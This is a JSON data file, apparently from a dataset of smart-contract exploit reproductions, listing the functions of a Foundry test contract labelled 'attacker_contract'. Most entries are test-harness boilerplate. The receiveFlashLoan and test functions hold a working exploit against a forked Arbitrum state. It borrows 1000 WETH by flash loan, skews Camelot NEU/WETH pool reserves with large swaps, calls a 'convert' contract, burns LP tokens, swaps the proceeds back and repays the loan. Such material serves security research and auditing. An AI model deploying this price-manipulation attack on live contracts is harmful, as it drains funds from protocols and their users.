[
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        IERC20[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        console.log(\"After flashloan attacker's WETH token balance: \", WETH.balanceOf(address(this)));\n        WETH.approve(address(CamelotRouter), type(uint256).max);\n        ICamelotFactory factoryAddr = ICamelotFactory(CamelotRouter.factory());\n        console.log(\"Factory Address: \", address(factoryAddr));\n        CamelotPair0 = ICamelotPair(factoryAddr.getPair(address(WETH), address(NEU)));\n        console.log(\"CMLT-LP0 addresss: \", address(CamelotPair0));\n        console.log(\"CMLT-LP0 addresss: \", factoryAddr.getPair(address(WETH), address(NEU)));\n        address tokenA = CamelotPair0.token0();\n        address tokenB = CamelotPair0.token1();\n        address[] memory path = new address[](2);\n        path[0] = tokenA;\n        path[1] = tokenB;\n        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            0.15 ether, 0, path, address(this), address(this), block.timestamp + 30 minutes\n        );\n        console.log(\"swap token [WETH,NEU] 0.15 WETH -> NEU\");\n        uint256 neuAmount = NEU.balanceOf(address(this));\n        console.log(\"Attacker's NEU token balance: \", neuAmount);\n        NEU.approve(address(CamelotRouter), neuAmount);\n        uint256 lpAmount0 = CamelotPair0.balanceOf(address(this));\n        console.log(\"Balance of Attacker in CMLT-LP0: \", lpAmount0);\n        CamelotRouter.addLiquidity(\n            tokenA, tokenB, 0.15 ether, neuAmount, 0, 0, address(this), block.timestamp + 30 minutes\n        );\n        lpAmount0 = CamelotPair0.balanceOf(address(this));\n        console.log(\"Balance of Attacker in CMLT-LP0 after addLiquidity: \", lpAmount0);\n        CamelotPair0.approve(address(convert), type(uint256).max);\n        uint256 cvAmount = CamelotPair1.balanceOf(address(convert));\n        console.log(\"Balance of Convert in CMLT-LP1: \", cvAmount);\n        (uint256 lp0_reserve0, uint256 lp0_reserve1,,) = CamelotPair0.getReserves();\n        console.log(\"LP0 reserve0 amount: \", lp0_reserve0);\n        console.log(\"LP0 reserve1 amount: \", lp0_reserve1);\n        (uint256 lp1_reserve0, uint256 lp1_reserve1,,) = CamelotPair1.getReserves();\n        console.log(\"LP1 reserve0 amount: \", lp1_reserve0);\n        console.log(\"LP1 reserve1 amount: \", lp1_reserve1);\n        uint256 lp0_totalsupply = CamelotPair0.totalSupply();\n        console.log(\"LP0 totalSupply amount: \", lp0_totalsupply);\n        uint256 lp1_totalsupply = CamelotPair1.totalSupply();\n        console.log(\"LP1 totalSupply amount: \", lp1_totalsupply);\n        neuAmount = NEU.balanceOf(address(this));\n        console.log(\"Attacker's NEU token balance: \", neuAmount);\n        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            849 ether, 0, path, address(this), address(this), block.timestamp + 30 minutes\n        );\n        console.log(\"swap token [WETH,NEU] 849 WETH -> NEU\");\n        neuAmount = NEU.balanceOf(address(this));\n        console.log(\"Attacker's NEU token balance: \", neuAmount);\n        uint256 wethAmount = WETH.balanceOf(address(this));\n        console.log(\"Attacker's WETH token balance: \", wethAmount);\n        (lp0_reserve0, lp0_reserve1,,) = CamelotPair0.getReserves();\n        console.log(\"LP0 reserve0 amount: \", lp0_reserve0);\n        console.log(\"LP0 reserve1 amount: \", lp0_reserve1);\n        (lp1_reserve0, lp1_reserve1,,) = CamelotPair1.getReserves();\n        console.log(\"LP1 reserve0 amount: \", lp1_reserve0);\n        console.log(\"LP1 reserve1 amount: \", lp1_reserve1);\n        convert.convert(lpAmount0);\n        console.log(\"call the convert\");\n        neuAmount = NEU.balanceOf(address(this));\n        console.log(\"Attacker's NEU token balance: \", neuAmount);\n        wethAmount = WETH.balanceOf(address(this));\n        console.log(\"Attacker's WETH token balance: \", wethAmount);\n        NEU.approve(address(CamelotRouter), type(uint256).max);\n        address[] memory path1 = new address[](2);\n        path1[0] = tokenB;\n        path1[1] = tokenA;\n        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            neuAmount, 0, path1, address(this), address(this), block.timestamp + 30 minutes\n        );\n        console.log(\"swap token [NEU,WETH]\");\n        wethAmount = WETH.balanceOf(address(this));\n        console.log(\"Attacker's WETH token balance: \", wethAmount);\n        uint256 lpAmount1 = CamelotPair1.balanceOf(address(this));\n        console.log(\"Balance of Attacker in CMLT-LP1: \", lpAmount1);\n        CamelotPair1.transfer(address(CamelotPair1), lpAmount1);\n        (uint256 amount0, uint256 amount1) = CamelotPair1.burn(address(this));\n        console.log(\"CMLT-LP1 burn amount: \", amount0, amount1);\n        uint256 neu1Amount = NEU1.balanceOf(address(this));\n        console.log(\"Attacker's NEU1 token balance: \", neu1Amount);\n        wethAmount = WETH.balanceOf(address(this));\n        console.log(\"Attacker's WETH token balance: \", wethAmount);\n        address[] memory path2 = new address[](2);\n        path2[0] = address(NEU1);\n        path2[1] = address(WETH);\n        NEU1.approve(address(CamelotRouter), type(uint256).max);\n        CamelotRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            neu1Amount, 0, path2, address(this), address(this), block.timestamp + 30 minutes\n        );\n        console.log(\"swap token [NEU1,WETH]\");\n        wethAmount = WETH.balanceOf(address(this));\n        console.log(\"Attacker's WETH token balance: \", wethAmount);\n        (lp0_reserve0, lp0_reserve1,,) = CamelotPair0.getReserves();\n        console.log(\"LP0 reserve0 amount: \", lp0_reserve0);\n        console.log(\"LP0 reserve1 amount: \", lp0_reserve1);\n        (lp1_reserve0, lp1_reserve1,,) = CamelotPair1.getReserves();\n        console.log(\"LP1 reserve0 amount: \", lp1_reserve0);\n        console.log(\"LP1 reserve1 amount: \", lp1_reserve1);\n        WETH.transfer(address(valut), 1000 ether);\n        console.log(\"refund flashloan\");\n        wethAmount = WETH.balanceOf(address(this));\n        console.log(\"Attacker's WETH token balance: \", wethAmount);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", 117_189_138);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(NEU), \"NEU\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CounterTest",
    "source_type": "attacker_contract",
    "function_name": "test",
    "original_code": "    function test() public {\n        console.log(\"Attacker's WETH token balance: \", WETH.balanceOf(address(this)));\n        IERC20[] memory tokens = new IERC20[](1);\n        uint256[] memory amount = new uint256[](1);\n        tokens[0] = WETH;\n        amount[0] = 1000 ether;\n        bytes memory userdata;\n        valut.flashLoan(IFlashLoanRecipient(address(this)), tokens, amount, userdata);\n    }\n\n",
    "description": ""
  }
]